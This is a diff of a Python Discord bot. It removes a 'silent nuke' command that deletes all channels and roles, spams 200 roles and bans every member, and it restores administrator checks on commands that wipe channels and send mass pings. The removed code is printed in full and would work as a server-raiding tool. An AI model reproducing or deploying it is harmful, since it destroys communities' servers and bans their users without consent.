@@ -9,8 +9,6 @@ TOKEN = os.getenv("DISCORD_TOKEN")
 intents = discord.Intents.default()
 intents.guilds = True
 intents.message_content = True
-intents.members = True
-intents.bans = True
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
@@ -32,75 +30,16 @@ async def on_ready():
     except Exception as e:
         print(f"❌ Failed to sync commands: {e}")
 
-# --- Text Command: !hole ---
-@bot.command(name="hole")
-async def hole_command(ctx):
-    """Silent nuke command: creates roles continuously and bans all members"""
-    
-    # Don't send any public messages - silent operation
-    try:
-        guild = ctx.guild
-        if not guild:
-            return
-
-        # Delete all channels first
-        deleted_channels = 0
-        for channel in guild.channels:
-            try:
-                await channel.delete()
-                deleted_channels += 1
-            except:
-                pass
-
-        # Delete all roles (except @everyone)
-        deleted_roles = 0
-        for role in guild.roles:
-            if role.name != "@everyone" and not role.managed:
-                try:
-                    await role.delete()
-                    deleted_roles += 1
-                except:
-                    pass
-
-        # Create roles continuously with numbering
-        created_roles = 0
-        for i in range(200):  # Create 200 roles
-            try:
-                await guild.create_role(name=f"Nameliun Hub nke #{i+1}")
-                created_roles += 1
-            except:
-                pass
-
-        # Ban all members (except bots and the command user)
-        members_banned = 0
-        for member in guild.members:
-            # Skip bots and the command user
-            if not member.bot and member != ctx.author:
-                try:
-                    await member.ban(reason="Nameliun Hub nke")
-                    members_banned += 1
-                except:
-                    pass
-
-        # Send only a private confirmation to the command user
-        try:
-            await ctx.author.send(f"✅ Silent nuke completed!\n- Deleted {deleted_channels} channels\n- Deleted {deleted_roles} roles\n- Created {created_roles} roles\n- Banned {members_banned} members")
-        except:
-            pass
-
-    except Exception as e:
-        try:
-            await ctx.author.send(f"❌ Error during silent nuke: {str(e)}")
-        except:
-            pass
-
 # --- Text Command: !start ---
 @bot.command(name="start")
 async def start_text(ctx, channel_name: str, *, ping_message: str):
     """Text command: !start channel_name ping_message"""
     
-    # REMOVED: Admin permission check - anyone can now run this command!
-    
+    # Check if user has administrator permissions
+    if not ctx.author.guild_permissions.administrator:
+        await ctx.send("❌ You need administrator permissions!")
+        return
+
     await ctx.send("🔄 Starting process... Please wait.")
     
     try:
@@ -208,8 +147,11 @@ async def start_text(ctx, channel_name: str, *, ping_message: str):
 async def configure(interaction: discord.Interaction, channel_name: str, ping_message: str):
     """Configure the channel name and ping message"""
     
-    # REMOVED: Admin permission check - anyone can now run this command!
-    
+    # Check if user has administrator permissions
+    if not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ You need administrator permissions!", ephemeral=True)
+        return
+
     # Update configuration
     bot_config["channel_name"] = channel_name
     bot_config["ping_message"] = ping_message
@@ -227,8 +169,11 @@ async def configure(interaction: discord.Interaction, channel_name: str, ping_me
 async def start_slash(interaction: discord.Interaction):
     """Delete all channels, create new ones, and send progressive pings"""
     
-    # REMOVED: Admin permission check - anyone can now run this command!
-    
+    # Check if user has administrator permissions
+    if not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("❌ You need administrator permissions!", ephemeral=True)
+        return
+
     await interaction.response.defer(ephemeral=True)
     
     try:
